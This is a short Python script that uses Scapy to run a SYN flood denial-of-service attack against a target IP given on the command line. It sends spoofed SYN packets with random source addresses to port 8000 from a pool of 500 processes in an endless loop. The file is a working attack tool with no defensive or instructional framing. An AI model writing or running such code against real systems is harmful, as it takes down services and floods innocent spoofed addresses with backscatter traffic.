import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

import multiprocessing
from random import randint
from scapy.all import *

# Set target ip
host = sys.argv[1]

# Set target port
port = 8000

# Set ping times
times = 10000

def Random_Section():
     section = random.randint(1,254)
     return section

def Random_IP():
    IP = str(Random_Section())+'.'+str(Random_Section())+'.'+str(Random_Section())+'.'+str(Random_Section())
    return IP

# Sending data based on Ethernet protocol
def syn_flood(host, random_source=True):
    # Randomly generate IP-ID
    id_ip = randint(1,65535)
    # Randomly generate source port
    src_port = randint(1,65535)

    if random_source ==True:
        source_ip = Random_IP()

        ip_proto = IP(src = source_ip,
                        dst = host,
                        ttl = 64,
                        id = id_ip)
    else:
        ip_proto = IP(dst = host,
                        ttl = 64,
                        id = id_ip)

    tcp_proto = TCP(sport = src_port,
                    dport = port,
                    flags = "S")

    pkt = ip_proto / tcp_proto
    send(pkt)

# Send {times} times
def syn_times(host, random_source=True):
    for i in range(times):
        syn_flood(host, random_source)

# Set concurrent
def syn_concurrent(host, processes=500, random_source=True):
    pool = multiprocessing.Pool(processes=processes)
    while True:
        try:
            pool.apply_async(syn_times,
                                (host, random_source))
        except KeyboardInterrupt:
            pool.terminate()

if __name__ == "__main__":
    syn_concurrent(host)
